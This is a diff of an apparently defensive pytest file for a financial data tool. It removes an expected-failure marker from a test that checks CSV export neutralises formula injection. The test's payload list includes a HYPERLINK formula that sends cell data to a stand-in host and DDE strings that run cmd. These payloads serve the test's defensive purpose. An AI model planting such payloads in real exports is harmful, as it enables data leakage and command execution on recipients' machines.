@@ -21,7 +21,6 @@ from finsight.rate_limiter import RateLimiter
 from finsight.sec_client import FileCache, HttpxFetcher, SecClient
 from finsight.views import export_csv
 
-from .attack_support import xfail_until
 
 BACKEND = pathlib.Path(__file__).resolve().parents[2]
 UA = "FinSight-AI KirmiziTakim test@example.com"
@@ -241,7 +240,6 @@ CSV_PAYLOADS = ['=HYPERLINK("https://kotu.example/?d="&A1,"tikla")', "+cmd|' /C 
                 "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0", "\t=1+1", "\r=1+1"]
 
 
-@xfail_until("CSV-DID", "denetim §3 önerisi: formül önekli metin hücreleri etkisizleştirilmeli")
 @pytest.mark.parametrize("payload", CSV_PAYLOADS)
 def test_csv_formula_injection_neutralized(payload):
     """Denetim §3 (CWE-1236, derinlemesine savunma) — Bugün serbest metin dışa aktarılmıyor;
